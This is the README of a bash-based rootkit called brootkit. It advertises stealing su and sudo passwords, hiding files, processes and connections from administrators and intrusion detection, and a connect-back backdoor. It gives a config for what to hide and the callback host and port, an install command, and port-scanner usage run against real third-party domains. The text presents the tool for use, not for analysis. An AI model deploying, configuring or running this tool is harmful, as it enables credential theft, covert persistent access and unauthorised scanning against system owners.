######BROOTKIT
    Lightweight rootkit implemented by bash shell scripts v0.06
    
    by wzt 2015   wzt.wzt@gmail.com http://www.cloud-sec.org
    
    If bash shell scripts can be designed for security tools like chkrootkit
    or rkhunter, so it can be implemented for a rootkit.

######FEATURES
    1. more hidable ability against admintrator or hids.
    2. su passwd thief.
    3. hide file and directorys.
    4. hide process.
    5. hide network connections.
    6. connect backdoor.
    7. muilt thread port scanner.

######TUBO
    1. sudo thief support.

######INSTALL

    1. edit br.conf first

      brootkit config file.

      #the ports will be hide: port1,port2,...,portn.
      HIDE_PORT               8080,8899
      #the files will be hide: file1,file2,...,filen.
      HIDE_FILE               br.conf,bashbd.sh,brootkit,.bdrc,brdaemon
      #the process will be hide: process1,process2,...,processn.
      HIDE_PROC               bashbd,brootkit,pty.spawn,brdaemon
      #the connect back host domain name or ip address.
      REMOTE_HOST             localhost
      #the connect back host port.
      REMOTE_PORT             8080
      #the connect backdoor base sleep time.
      SLEEP_TIME              60
    2. ./install.sh

    3. muilt thread port scanner.

      [root@localhost brootkit]$ ./brscan.sh
      ./brscan.sh <-p> [-n|-t|-o|-h] <remote_host>

      option:
      -p              ports, pattern: port1,port2,port3-port7,portn...
      -n              thread num, defalut is 10
      -t              timeout, default is 30s
      -o              results write into log file, default is brscan.log
      -h              help information.

      exp:
      ./brscan.sh -p 21,22,23-25,80,135-139,8080 -t 20 www.cloud-sec.org
      ./brscan.sh -p 1-65525 -n 200 -t 20 www.cloud-sec.org
      [root@localhost brootkit]$ ./brscan.sh -p 21,22-80 -n 20 www.aliyun.com
      host: www.aliyun.com | total ports: 60 | thread num: 20 timeout: 30 | logfile: brscan.log

      connect to www.aliyun.com:80 ok.

######SOURCE
    https://github.com/cloudsec/brootkit


